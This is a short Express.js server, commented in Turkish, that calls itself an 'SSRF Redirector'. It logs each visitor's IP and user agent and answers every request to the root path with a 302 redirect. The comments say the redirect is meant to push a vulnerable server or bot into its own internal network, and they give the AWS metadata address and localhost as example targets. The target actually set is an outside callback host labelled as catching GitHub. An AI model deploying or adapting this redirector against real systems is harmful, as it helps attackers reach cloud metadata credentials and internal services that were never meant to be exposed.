const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use((req, res, next) => {
    console.log('--- YENİ İSTEK GELDİ ---');
    console.log('Method:', req.method);
    console.log('URL:', req.url);
    console.log('IP:', req.ip || req.headers['x-forwarded-for']);
    console.log('User-Agent:', req.headers['user-agent']);
    console.log('------------------------');
    next();
});

// Ana domaine gelen isteği direkt hedeflediğin iç ağ adresine 302 ile fırlat
app.get('/', (req, res) => {
    // Burada hedef uygulamanın kendi iç ağında erişmesini istediğin adresi yazıyorsun
    // Örn: AWS Metadata -> 'http://169.254.169.254/latest/meta-data/'
    // Örn: Localhost -> 'http://127.0.0.1:8080/'
    
    const internalTarget = 'https://collab-fv3u.onrender.com/yakalandi-github'; // Hedefin kendi içindeki adres
    
    console.log(`[!] İstek yakalandı, ${internalTarget} adresine yönlendiriliyor (302)...`);
    
    // 302 redirect ile zafiyetli botu/sunucuyu iç ağa yönlendiriyoruz
    return res.redirect(302, internalTarget);
});

app.listen(3000, () => console.log("SSRF Redirector 3000 portunda devrede!"));
